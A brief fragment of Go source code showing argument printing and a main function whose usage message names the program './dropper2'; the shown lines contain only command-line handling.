		fmt.Print(cliargs[i])
	}
	genfunc()
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./dropper2 -h to show the help menu.")
		os.Exit(1)
	} else {
		clifunc()
	}
}
